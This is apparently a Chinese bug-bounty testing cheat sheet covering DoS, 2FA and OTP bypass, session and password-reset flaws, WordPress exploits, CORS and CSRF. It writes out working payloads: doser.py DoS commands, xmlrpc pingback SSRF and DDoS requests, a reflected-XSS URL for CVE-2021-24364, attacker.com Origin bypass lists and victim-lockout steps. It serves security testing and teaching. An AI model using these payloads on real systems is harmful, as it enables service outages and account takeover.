<p>我应该也有相关的 Exploit 文章记录。 * 参考 <a target="_blank" rel="noopener" href="https://www.acunetix.com/vulnerabilities/web/long-password-denial-of-service/">Long password denial of<br>service</a><br><a target="_blank" rel="noopener" href="https://hackerone.com/reports/738569">No length on password</a></p>
</blockquote>
<h4><span id="长字符拒绝服务">长字符拒绝服务</span></h4><blockquote>
<p>当使用一些过长的字符串时，服务器可能无法处理，在一定时间内造成拒绝服务。<br>* 测试点： 1.<br>尝试在用户名或网路地址，甚至文件与图片名中使用约1000字符的字串； 2. 用<br>B 账户搜索 A 账户，其中 A 账户为长字串。 看看是否一致处于搜寻状态<br>或者应用崩溃，返回 500 状态码</p>
<ul>
<li>参考 <a target="_blank" rel="noopener" href="https://shahjerry33.medium.com/long-string-dos-6ba8ceab3aa0">Long String<br>DoS</a><br><a target="_blank" rel="noopener" href="https://hackerone.com/reports/764434">profile-picture name parameter with large value lead to DoS for<br>other users and programs on the<br>platform</a></li>
</ul>
</blockquote>
<h4><span id="试试这个密码">试试这个密码</span></h4><blockquote>
<p>实际上并不建议使用超过 5000 个字符的密码<br>但这里有一个<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/KathanP19/HowToHunt/master/Application_Level_DoS/Password.txt">密码本</a></p>
</blockquote>
<h4><span id="对受害者的永久拒绝服务">对受害者的永久拒绝服务</span></h4><blockquote>
<p>这不仅是从应用角度的 DoS，而且可能是对受害者永久的<br>DoS。在某些网站中，用户用错误的登录凭据登录后，在一定时间内会被登录阻止，我们把这个功能视为<br>Bug :D。 * 测试方式： 1. 到某个网站的登录页面（如 example.com）； 2.<br>现在输入有效的电子邮件账户和错误的密码； 3. 多登录几次（至少 10 - 20<br>次），可以用 BurpSuite<br>进行重发（这里要关注一个验证码问题，这个每次要输入，有时候可能也做了加密处理）；<br>4. 如果账号被阻止登录，且时长越来越长，超过 30<br>分钟，可以视为存在漏洞。</p>
<ul>
<li>需要注意：</li>
</ul>
<ol>
<li>确保登录期间没有验证码，因为我们不能使用任何自动化工具来循环请求；</li>
<li>确保旧的登录会话在被阻止登录后已经过期。</li>
</ol>
<p>反馈此漏洞时可以说能够通过时间间隔循环此登录请求来阻止某用户正常登录。<br>* 参考 <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=5drIMXCQuNw">Commonly Misunderstood Bugs: DDoS &amp;<br>DOS</a></p>
</blockquote>
<h3><span id="绕过身份验证authentication-bypass">绕过身份验证（Authentication Bypass）</span></h3><blockquote>
<p>讲道理，这里的绕过身份认证更多的是在知道密码的情况下绕过二次认证，要知道用户密码为前提有点没太大意义，无法扩散危害，只能说机制有漏洞可能被劫持利用。</p>
</blockquote>
<h3><span id="二次认证2fa绕过">二次认证（2FA）绕过</span></h3><h4><span id="修改响应">修改响应</span></h4><blockquote>
<p>如果在 2FA<br>认证的响应包中表示认证状态的布尔值”success”为”false”，改成”true”试一下。</p>
</blockquote>
<h4><span id="修改状态码">修改状态码</span></h4><blockquote>
<p>如果认证响应的状态码为 4xx，改成 200 OK 看看能不能绕过。</p>
</blockquote>
<h4><span id="2fa-码泄露">2FA 码泄露</span></h4><blockquote>
<p>拦截认证响应包，看看是否有 2FA 码直接泄露。</p>
</blockquote>
<h4><span id="分析-js-代码">分析 JS 代码</span></h4><blockquote>
<p>就是看看能不能在认证页的 JS 中直接找到 2FA 码生成的代码，以此推测出<br>2FA 码。</p>
</blockquote>
<h4><span id="2fa-码重用">2FA 码重用</span></h4><blockquote>
<p>相同的 2FA 码能够被用于下次认证。</p>
</blockquote>
<h4><span id="缺少爆破防护">缺少爆破防护</span></h4><blockquote>
<p>不够长的 2FA 码或许能够被爆破出来。</p>
</blockquote>
<h4><span id="2fa-码缺少完整性验证">2FA 码缺少完整性验证</span></h4><blockquote>
<p>任何用户的 2FA 码都可以通过认证。</p>
</blockquote>
<h4><span id="在禁用-2fa-时进行csrf">在禁用 2FA 时进行CSRF</span></h4><blockquote>
<p>禁用 2FA 时没有进行 CSRF 保护，或者没有再次进行 2FA 验证。</p>
</blockquote>
<h4><span id="密码重置禁用-2fa">密码重置禁用 2FA</span></h4><blockquote>
<p>在密码更改&#x2F;电子邮件更改时禁用 2FA 验证。</p>
</blockquote>
<h4><span id="backup-code-abuse">Backup Code Abuse</span></h4><blockquote>
<p>Bypassing 2FA by abusing the Backup code feature Use the above<br>mentioned techniques to bypass Backup Code to remove&#x2F;reset 2FA<br>restrictions （这里说的是因为备份码被滥用而绕过 2FA<br>验证，但是我没能理解，看参考文章也是每太理解，就放在这了）</p>
</blockquote>
<h4><span id="在禁用-2fa-页面进行点击劫持">在禁用 2FA 页面进行点击劫持</span></h4><blockquote>
<p>在 2FA 禁用页面设置点击劫持，并利用社会工程学方式诱导禁用 2FA。</p>
</blockquote>
<h4><span id="启用-2fa-无法使之前的会话过期">启用 2FA 无法使之前的会话过期</span></h4><blockquote>
<p>如果存在被劫持的会话且没有设置会话超时，则 2FA 会被绕过。</p>
</blockquote>
<h4><span id="利用-null-或-000000-绕过-2fa">利用 null 或 000000 绕过 2FA</span></h4><blockquote>
<p>在输入 2FA 码时利用 null 或者 000000 尝试进行绕过。</p>
</blockquote>
<blockquote>
<ul>
<li>参考 <a target="_blank" rel="noopener" href="https://research.nccgroup.com/2021/06/10/testing-two-factor-authentication/">Testing Two-Factor<br>Authentication</a><br><a target="_blank" rel="noopener" href="https://medium.com/@lukeberner/how-i-abused-2fa-to-maintain-persistence-after-a-password-change-google-microsoft-instagram-7e3f455b71a1">How I abused 2FA to maintain persistence after a password<br>change</a></li>
</ul>
</blockquote>
<h3><span id="一次性密码x2f动态密码otp绕过">一次性密码&#x2F;动态密码（OTP）绕过</span></h3><h4><span id="修改响应包在注册用户页x2f登录账户绕过-otp">修改响应包在注册用户页&#x2F;登录账户绕过 OTP</span></h4><blockquote>
<p>方式一： 1. 使用手机号码注册账户&#x2F;登录账户并申请 OTP； 2. 输入不正确的<br>OTP 并在 BurpSuite 中捕获请求； 3. 拦截响应并修改：</p>
</blockquote>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">响应如果是：</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;verificationStatus&quot;</span><span class="punctuation">:</span><span class="keyword">false</span><span class="punctuation">,</span><span class="attr">&quot;mobile&quot;</span><span class="punctuation">:</span><span class="number">9072346577</span><span class="string">&quot;,&quot;</span>profileId<span class="string">&quot;:&quot;</span><span class="number">84673832</span><span class="string">&quot;&#125;</span></span><br><span class="line"><span class="string">修改为：</span></span><br><span class="line"><span class="string">&#123;&quot;</span>verificationStatus<span class="string">&quot;:true,&quot;</span>mobile<span class="string">&quot;:9072346577&quot;</span><span class="punctuation">,</span><span class="attr">&quot;profileId&quot;</span><span class="punctuation">:</span><span class="string">&quot;84673832&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>转发此响应，看能否登录账户。</p>
<p>方式二： 1. 使用任意 2 个手机号码注册 2 个账户，第一个手机输入正确的<br>OTP； 2. 拦截注册请求，并选择拦截此请求的响应，放行请求； 3.<br>记录响应包中各参数状态； 4. 另一个手机输入错误的 OTP； 5.<br>拦截注册请求，并选择拦截此请求的响应，放行请求； 6.<br>将响应包中各参数修改为正确 OTP 响应状态值，看是否能成功登录。</p>
</blockquote>
<h4><span id="使用重发器重复提交表单绕过-otp">使用重发器重复提交表单绕过 OTP</span></h4><blockquote>
<ol>
<li>使用不存在的电话号码创建账户；</li>
<li>利用 BurpSuite 拦截请求，并发送到重发器（Repeater）；</li>
<li>把重发器中请求的电话号码修改为正确的电话号码后，记录 OTP；</li>
<li>回到拦截器（Intercept），放行请求，尝试用之前获得的 OTP 进行注册。</li>
</ol>
</blockquote>
<h4><span id="无速率限制">无速率限制</span></h4><blockquote>
<ol>
<li>创建账户，当应用程序需要你提供 OTP 时，输入错误的 OTP<br>并拦截此请求；</li>
<li>将此请求发送至重发器（Repeater），选择 OTP<br>的值，开始在有效范围爆破；</li>
<li>如果没有速率限制，当 OTP 较短复杂度较低，则很容易爆破出来。</li>
</ol>
</blockquote>
<h3><span id="利用断开链接劫持broken-link-hijacking">利用断开链接劫持（Broken-Link Hijacking）</span></h3><blockquote>
<ol>
<li>查找目标站点上的外部链接（如一些指向社交媒体账户的链接或一些外部媒体链接）</li>
<li>检查目标站点公司是否是这个链接的域名所有，没有的话可能被注册用于恶意行为。</li>
</ol>
<p>举例，一个很有名的网站上有调用 JS 文件，存放 JS<br>文件的链接已经失效，你可以注册，然后在相同的路径放上恶意的 JS<br>文件。以下工具用于查找断开的链接：<br><a target="_blank" rel="noopener" href="https://github.com/stevenvachon/broken-link-checker">broken-link-checker</a><br><a target="_blank" rel="noopener" href="https://ahrefs.com/broken-link-checker">Online Broken Link Checker</a><br><a target="_blank" rel="noopener" href="https://brokenlinkcheck.com/">Alternative Online Broken Link Checker</a><br>* 参考 <a target="_blank" rel="noopener" href="https://edoverflow.com/2017/broken-link-hijacking/">Broken Link Hijacking - How expired links can be<br>exploited</a> <a target="_blank" rel="noopener" href="https://medium.com/@bathinivijaysimhareddy/how-i-takeover-the-companys-linkedin-page-790c9ed2b04d">How I<br>was able to takeover the company’s LinkedIn<br>Page</a></p>
</blockquote>
<h3><span id="由会话衍生的问题session-based-bugs">由会话衍生的问题（Session Based Bugs）</span></h3><blockquote>
<p>会话的认证与劫持很多也是建立在你能获取一定的信息上的，也更多是机制上的问题，危害传播更困难。</p>
</blockquote>
<h4><span id="旧会话在密码更改后不会过期">旧会话在密码更改后不会过期</span></h4><blockquote>
<ol>
<li>在目标站点上创建账户；</li>
<li>使用同一账户登录两个浏览器（以 Chrome 和 Firefox 为例）；</li>
<li>在 Chrome 中更改密码，成功更改后，刷新在 Firefox<br>上的页面，看看是否是登录状态。</li>
</ol>
</blockquote>
<h4><span id="会话劫持预期行为">会话劫持（预期行为）</span></h4><blockquote>
<ol>
<li>创建你的账户并登录；</li>
<li>利用浏览器的 cookie 编辑器插件，copy 所有的目标<br>cookie，然后登出你的账户；</li>
<li>把所有的目标 cookie 粘贴进 cookie 编辑器；</li>
<li>刷新页面，看看你是否还是登陆状态。</li>
</ol>
<p>Firefox<br>的插件<a target="_blank" rel="noopener" href="https://addons.mozilla.org/zh-CN/firefox/addon/cookie-editor/#:~:text=%E5%85%B3%E4%BA%8E%E6%AD%A4%E6%89%A9%E5%B1%95%20Cookie-Editor%20is%20designed%20to%20have%20a%20simple,delete%20all%20the%20cookies%20for%20the%20current%20page.">Cookie-Editor</a></p>
</blockquote>
<h4><span id="密码重置令牌不会过期不安全的可配置项">密码重置令牌不会过期（不安全的可配置项）</span></h4><blockquote>
<ol>
<li>在目标网站上创建账户后，登录时请求忘记密码；</li>
<li>不要使用重置密码的链接，而是使用旧密码登录，并将你的电子邮件修改为其他邮箱；</li>
<li>现在使用发送到旧电子邮箱的修改密码链接，看是否可以修改密码，如果是，则存在漏洞。</li>
</ol>
</blockquote>
<h4><span id="安全页的缓存控制服务器安全性配置错误">安全页的缓存控制（服务器安全性配置错误）</span></h4><blockquote>
<ol>
<li>登录应用程序页面，浏览使用功能后注销；</li>
<li>按 Alt + ← ，看是否能回到应用程序登录后的页面。</li>
</ol>
</blockquote>
<h4><span id="绕过电子邮件确认认证">绕过电子邮件确认认证</span></h4><blockquote>
<ol>
<li>在创建用户时，会收到一个邮箱验证链接；</li>
<li>应用程序在没有进行邮箱验证的情况下只会提供较少的权限和功能许可访问；</li>
<li>登录到应用程序，将电子邮件地址更改为电子邮件 B；</li>
<li>会向电子邮件 B 再发送一份验证链接；</li>
<li>将电子邮件更改回创建账户时的电子邮件，看电子邮件是否已验证。</li>
</ol>
<p>这个并不适用于创建账户就要邮箱的情况，感觉要邮箱链接确认账户激活才能登录就会不行，除非注册时候换邮箱再换回去也可以（但理论上再换回去回再发一封确认邮件）；而当用手机号等登录上去了，绑定邮箱有可能都不要验证。</p>
</blockquote>
<h4><span id="电子邮件验证绕过">电子邮件验证绕过</span></h4><blockquote>
<ol>
<li>使用自己的电子邮件地址创建一个账户，创建中会需要电子邮件验证；</li>
<li>不要使用验证链接，而是回到注册页，把电子邮件地址修改为受害者电子邮件地址进行创建；</li>
<li>现在回到自己的电子邮箱，确认链接，看是不是受害者的邮箱被确认。</li>
</ol>
</blockquote>
<h4><span id="旧密码重置令牌在请求新令牌时未过期">旧密码重置令牌在请求新令牌时未过期</span></h4><blockquote>
<ol>
<li>首先，利用有效的电子邮箱创建一个账户，然后注销；</li>
<li>选择忘记密码，请求重置密码链接，但是不要去邮箱使用链接；</li>
<li>再次请求一个密码重置链接；</li>
<li>去电子邮箱使用第一个密码重置链接，看是否能修改密码。</li>
</ol>
</blockquote>
<h4><span id="密码重置令牌在密码更改后未过期">密码重置令牌在密码更改后未过期</span></h4><blockquote>
<ol>
<li>首先，利用有效的电子邮箱创建一个账户，然后注销；</li>
<li>选择忘记密码，请求重置密码链接，使用密码重置链接修改密码后登录；</li>
<li>现在再次使用邮箱中的密码重置链接，看是否还能修改密码。</li>
</ol>
</blockquote>
<h3><span id="内容管理系统cms">内容管理系统（CMS）</span></h3><h4><span id="wordpress">Wordpress</span></h4><blockquote>
<p>基本扫描工具<a target="_blank" rel="noopener" href="https://wpscan.com/">Wpscan</a></p>
</blockquote>
<blockquote>
<p>xmlrpc.php 这是 wordpress<br>上常见的问题之一，可以通过这种错误的配置进行漏洞利用。</p>
<p>检测： * 访问 site.com&#x2F;xmlrpc.php（有可能有二级路径） * 获取有关<br>POST 请求的错误信息</p>
<p>利用： * 拦截请求包，把请求方式由 GET 改为 POST * 列出所有 method</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodName</span>&gt;</span>system.listMethods<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">params</span>&gt;</span><span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>检查是否存在<code>pingback.ping</code>方式</li>
<li>试试 DDoS</li>
</ul>
</blockquote>
<pre><code>&lt;methodCall&gt;
&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
&lt;params&gt;&lt;param&gt;
&lt;value&gt;&lt;string&gt;http://&lt;YOUR SERVER &gt;:&lt;port&gt;&lt;/string&gt;&lt;/value&gt;
&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://&lt;SOME VALID BLOG FROM THE SITE &gt;&lt;/string&gt;
&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>
<blockquote>
<ul>
<li>试试 SSRF（仅限内部端口扫描）</li>
</ul>
</blockquote>
<pre><code>&lt;methodCall&gt;
&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
&lt;params&gt;&lt;param&gt;
&lt;value&gt;&lt;string&gt;http://&lt;YOUR SERVER &gt;:&lt;port&gt;&lt;/string&gt;&lt;/value&gt;
&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://&lt;SOME VALID BLOG FROM THE SITE &gt;&lt;/string&gt;
&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/nullfil3/xmlrpc-scan">XMLRPC-Scan</a> 可以配合<br>BurpSuite 一起测试。 * 参考 <a target="_blank" rel="noopener" href="https://m0chan.github.io/2019/12/17/Bug-Bounty-Cheetsheet.html">Bug Bounty Cheat<br>Sheet</a><br>这篇文章或许会很有用 <a target="_blank" rel="noopener" href="https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32">Wordpress xmlrpc.php -common vulnerabilites &amp;<br>how to exploit<br>them</a><br>讲的很清晰</p>
</blockquote>
<blockquote>
<p>目录枚举 有时开发人员会忘记禁用<code>/wp-content/uploads</code>上的目录列表。</p>
<p>检测： &#x2F;wp-content&#x2F;uploads 可以将这个路径加入到模糊词表中</p>
<p>其实有一个目录爆破工具<a target="_blank" rel="noopener" href="https://github.com/OJ/gobuster">gobuster</a><br>挺好用也挺强大的 * 参考 <a target="_blank" rel="noopener" href="https://hackerone.com/reports/201984">Wordpress directories&#x2F;files visible to<br>internet</a></p>
</blockquote>
<blockquote>
<p>CVE-2018-6389 此问题可能会使 4.9.3 以下的任何 Wordpress 网站关闭。</p>
<p>检测： 利用下面链接内的 poc，在可疑的 Wordpress<br>站点请求，你在响应中会获得一堆的 js 数据：<br><a target="_blank" rel="noopener" href="https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9">loadsxploit</a></p>
<p>利用： 您可以使用任何 Dos 工具，Doser 好像很快，在 30 秒内关闭了 Web<br>服务器： <a target="_blank" rel="noopener" href="https://github.com/quitten/doser.py">Doser</a><br><code>python3 doser.py -t 999 -g &#39;https://site.com/fullUrlFromLoadsxploit&#39;</code></p>
<ul>
<li>参考 <a target="_blank" rel="noopener" href="https://hackerone.com/reports/752010">DoS of https://nordvpn.com/ via CVE-2018-6389<br>exploitation</a> <a target="_blank" rel="noopener" href="https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html">How to DoS<br>29% of the World Wide Websites -<br>CVE-2018-6389</a><br>原理讲的很详细</li>
</ul>
</blockquote>
<blockquote>
<p>CVE-2021-24364 5.4.4之前的Jannah<br>WordPress主题在将其输出回页面之前，没有正确清理tie_get_user_weather<br>AJAX操作中的选项JSON参数，导致了一个反映的跨站点脚本（XSS）漏洞。</p>
<p>检测并且利用： 把 <code>&lt;Your_WP-Site-here&gt;</code>{&#x3D;html} 替换成你的 WP<br>站点请求即可等待弹窗：</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Your_WP-Site-here</span>&gt;</span>/wp-admin/admin-ajax.php?action=tie_get_user_weather&amp;options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D</span><br></pre></td></tr></table></figure>

<blockquote>
<p>WP Cronjob DoS 你可以在这个区域也尝试一下 DoS。</p>
<p>检测： * 访问 site.com&#x2F;wp-cron.php * 您将看到一个空白页面，其中包含<br>200 HTTP 状态码</p>
<p>利用： 同样使用 Doser 来利用：<br><code>python3 doser.py -t 999 -g &#39;https://site.com/wp-cron.php&#39;</code></p>
<p><a target="_blank" rel="noopener" href="https://github.com/wpscanteam/wpscan/issues/1299">WP-Cron detection?</a><br><a target="_blank" rel="noopener" href="https://medium.com/@thecpanelguy/the-nightmare-that-is-wpcron-php-ae31c1d3ae30">The nightmare that is<br>wp-cron.php</a></p>
</blockquote>
<blockquote>
<p>WP 用户枚举<br>仅当目标网站隐藏其当前用户或未公开可用时，此问题才会被接受。因此，攻击者更多是使用这些用户数据进行爆破。</p>
<p>检测： * 访问 site.com&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F; * 您将看到带有用户信息的<br>json 数据作为响应</p>
<p>利用：</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如果能联合 xmlrpc.php 方式的信息泄露，去请求，如使用</span><br><span class="line">*)wp.getUserBlogs</span><br><span class="line">*)wp.getCategories</span><br><span class="line">*)metaWeblog.getUsersBlogs）</span><br><span class="line">则能更准确的进行爆破，详见 xmlrpc.php 版块的 </span><br><span class="line">Wordpress xmlrpc.php -common vulnerabilites &amp; how to exploit them 文章</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>参考 <a target="_blank" rel="noopener" href="https://hackerone.com/reports/356047">Wordpress Users Disclosure<br>(&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;)</a></li>
</ul>
</blockquote>
<h4><span id="moodle">Moodle</span></h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://dewangpanchal98.medium.com/mass-hunting-xss-moodle-ed4b50c82516">Mass Hunting XSS —<br>Moodle</a><br>确实一篇文章讲述清楚了 &#x3D; &#x3D;</p>
</blockquote>
<h3><span id="跨域资源共享cors">跨域资源共享（CORS）</span></h3><h4><span id="cors-配置错误">CORS 配置错误</span></h4><blockquote>
<p>单目标狩猎： 1. 用爬虫爬取目标网站并用 BurpSuite 截取请求与响应； 2.<br>用 BurpSuite 寻找<code>Access-Control</code>； 3.<br>尝试在请求中添加<code>Origin Header</code>，如<code>Origin:attacker.com</code>或<code>Origin:null</code>或<code>Origin:attacker.target.com</code>或<code>Origin:target.attacker.com</code>；<br>4. 如果在响应中发现了 Origin 的相关信息，则目标站点可能存在错误的 CORS<br>配置。</p>
</blockquote>
<blockquote>
<p>多目标（含子域）狩猎： 1.<br>子域发现：<code>subfinder -d target.com -o domains.txt</code>； 2.<br>域名判活：<code>cat domains.txt | httpx | tee -a alive.txt</code>； 3.<br>把每一个存活子域送进<br>BurpSuite：<code>cat alive.txt | parallel -j 10 curl --proxy &quot;http://127.0.0.1:8080&quot; -sk 2&gt;/dev/null</code>；<br>4. 如单目标一般开始狩猎。</p>
</blockquote>
<blockquote>
<p>憨批为什么不用自动化工具：<br><a target="_blank" rel="noopener" href="https://github.com/chenjj/CORScanner">CORScanner</a><br><a target="_blank" rel="noopener" href="https://github.com/lc/theftfuzzer">theftfuzzer</a><br><a target="_blank" rel="noopener" href="https://github.com/s0md3v/Corsy">Corsy</a><br><a target="_blank" rel="noopener" href="https://github.com/Shivangx01b/CorsMe">CorsMe</a></p>
<ul>
<li>参考<br><a target="_blank" rel="noopener" href="https://www.jianjunchen.com/post/cors%E5%AE%89%E5%85%A8%E9%83%A8%E7%BD%B2%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/">绕过浏览器SOP，跨站窃取信息：CORS配置安全漏洞报告及最佳部署实践</a><br>讲得很好</li>
</ul>
</blockquote>
<blockquote>
<p>自动化狩猎： 1. 利用 subfinder、assetfinder、findomain<br>等工具搜寻子域：<code>subfinder -d target.com | tee -a hosts1 , findomain -t target.com | tee -a hosts1 , assetfinder --subs-only target.com |tee -a hosts1</code>；<br>2.<br>之后做一下数据处理与判活：<code>cat hosts1 | sort -u | tee -a hosts2</code>，<code>cat hosts2 | httpx | tee -a hosts</code>；<br>3. 看看这些 hosts 在终端有哪些路径回显； 4. 然后试试 <code>meg -v</code>； 5.<br>进程完成后再利用 gf 看看 CORS； 6.<br>所有链接将携带<code>Access-Control-Allow</code>被展示出来。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/tomnomnom/meg">meg</a><br><a target="_blank" rel="noopener" href="https://github.com/tomnomnom/gf">gf</a><br><a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/subfinder">subfinder</a><br><a target="_blank" rel="noopener" href="https://github.com/tomnomnom/assetfinder">assetfinder</a><br><a target="_blank" rel="noopener" href="https://github.com/Findomain/Findomain">findomain</a><br><a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/httpx">httpx</a></p>
</blockquote>
<h4><span id="cors-绕过">CORS 绕过</span></h4><blockquote>
<p>POC:</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Origin:null</span><br><span class="line">Origin:attacker.com</span><br><span class="line">Origin:attacker.target.com</span><br><span class="line">Origin:attackertarget.com</span><br><span class="line">Origin:sub.attackertarget.com</span><br><span class="line">Origin:attacker.com <span class="keyword">and</span> then change the method Get to post/Post to Get</span><br><span class="line">Origin:sub.attacker target.com</span><br><span class="line">Origin:sub.attacker%target.com</span><br><span class="line">Origin:attacker.com/target.com</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>参考 Twitter：<a target="_blank" rel="noopener" href="https://twitter.com/trbughunters/status/1287023673845612546">TR Bug<br>Hunters@trbughunters</a><br>Twitter：<a target="_blank" rel="noopener" href="https://twitter.com/Paresh_parmar1/status/1265251507655630848">Paresh@Paresh_parmar1</a><br>Twitter：<a target="_blank" rel="noopener" href="https://twitter.com/Alra3ees/status/1141504347089584128">Emad Shanab - أبو عبد<br>الله@Alra3ees</a></li>
</ul>
</blockquote>
<h3><span id="csrf">CSRF</span></h3><h4><span id="csrf-发现">CSRF 发现</span></h4><blockquote>
<ol>
<li><p>只需删除 CRSF token 毫不夸张地说，这是许多网络应用中常见的问题；</p>
</li>
<li><p>令牌未连接到会话 网络应用程序只检查了 token<br>的是否存在即有效性，并未检测它的归属性，可以看看： Bob 的 token 对<br>Alice 有效吗？ 任何匿名用户的 token 对 Alice 有效吗？</p>
</li>
<li><p>利用 Content-Type 移除 token 并且更换 Content-Type： Urlencoded<br>form -&gt; JSON JSON -&gt; Urlencoded form Urlencoded form -&gt;<br>multipart form</p>
</li>
<li><p>转换请求方式 POST -&gt; GET 服务器可能会跳过对 GET 请求的 CSRF<br>检查并接受 URL 中的正文参数：</p>
</li>
</ol>
</blockquote>
<pre><code>POST /change_password
POST body:
new_password=qwerty

GET /change_password?new_password=qwerty
</code></pre>
<blockquote>
<ol start="5">
<li><p>PHP 类型戏法<br>使用松散的比较策略（&#x3D;&#x3D;，!&#x3D;）可能会导致意料之外的结果并产生 CSRF<br>绕过的风险： <code>&#123;&quot;action&quot;: &quot;delete&quot;, &quot;csrf&quot;: &quot;1bc...ade&quot;&#125;</code><br><code>&#123;&quot;action&quot;: &quot;delete&quot;, &quot;csrf&quot;: 0&#125;</code></p>
</li>
<li><p>双重 Cookie 提交 如果你能控制用户的 cookie，尝试把你自己的 CSRF<br>token 都放置在 body 和 cookie 中，可以尝试： Cookie 注入<br>任何子域的 XSS 子域接管</p>
</li>
</ol>
</blockquote>
<h4><span id="csrf-绕过">CSRF 绕过</span></h4><blockquote>
<p>CSRF<br>可能出现在登录，注销，重置凭证，更改密码，添加购物车，喜欢，评论，个人资料更改，用户详细信息更改，余额转移，订阅等位置： -<br>更改请求方法 [POST &#x3D;&gt; GET] - 删除整个 token 参数 -<br>删除令牌，并给出一个空白参数 - 使用在另一个请求中未使用的有效令牌 -<br>使用自己的 CSRF token 将其提供给受害者 - 用相同长度的值替换 token -<br>逆向工程令牌 - 通过 HTML 注入提取 Token - 从 Non-Form<br><code>Content-Type: application/json</code>或<code>Content-Type: application/x-url-encoded</code>切换到<code>Content-Type: form-multipart</code> -<br>更改&#x2F;删除令牌中的最后一个或第一个字符 - 将<code>referrer</code>更改为<code>Referrer</code> -<br>绕过正则表达式 如果网站在引用的 URL<br>中寻找”bank.com”，那么”bank.com.attacker.com”或”attacker.com&#x2F;bank.com”可能会起作用。 -<br>删除引用标题（在您的 payload 或 html<br>代码中添加<code>&lt;meta name=”referrer” content=”no-referrer”&gt;</code>） - 点击劫持<br>（如果您不熟悉点击劫持攻击，可以在<a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/Clickjacking">OWASP</a><br>找到更多信息。） 在同一端点上利用点击劫持会绕过所有 CSRF<br>保护。因为从技术上讲，请求确实来自合法站点。如果易受攻击的端点所在的页面容易受到点击劫持，则所有<br>CSRF 保护都将变得无关紧要，您将能够获得与端点上的 CSRF<br>攻击相同的结果，尽管需要付出更多努力。</p>
<ul>
<li>参考 <a target="_blank" rel="noopener" href="https://medium.com/swlh/intro-to-csrf-cross-site-request-forgery-9de669df03de">Intro to CSRF: Cross-Site Request<br>Forgery</a><br><a target="_blank" rel="noopener" href="https://medium.com/swlh/attacking-sites-using-csrf-ba79b45b6efe">Attacking Sites Using<br>CSRF</a><br><a target="_blank" rel="noopener" href="https://medium.com/swlh/bypassing-csrf-protection-c9b217175ee">Bypassing CSRF<br>Protection</a><br>讲的都挺好的</li>
</ul>
</blockquote>
<h3><span id="寻找-cvefinding-cves">寻找 CVE（finding CVES）</span></h3><h4><span id="cves">CVES</span></h4><blockquote>
<ol>
<li>抓取所以子域，如<code>subfinder -d domain.com | tee -a domains.txt</code>；</li>
<li>寻找所有存活域，如<code>cat domains.txt | httpx -status-code | grep 200 | cut -d &quot; &quot; -f1 | tee -a alive.txt</code>；</li>
<li>利用 <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei">nuclei</a><br>进行基本检测、面板检测、工作流检测、cve<br>模板检测，并把检测结果保存至不同文件中：<code>cat alive.txt | nuclei -t nuclei-templates/workflows | tee -a workflows</code>；</li>
<li>仔细且有耐心的查看输出；</li>
<li>在你的目标上发现些有趣的东西，比如使用了 Jira；</li>
<li>把该链接放入浏览器看看版本；</li>
<li>去找找看这个版本的 Jira 是否存在什么漏洞；</li>
<li>去寻找这个漏洞的各种 poc，包括别人可能改进的。</li>
</ol>
</blockquote>
<h3><span id="web-应用程序渗透测试检测清单">Web 应用程序渗透测试检测清单</span></h3><blockquote>
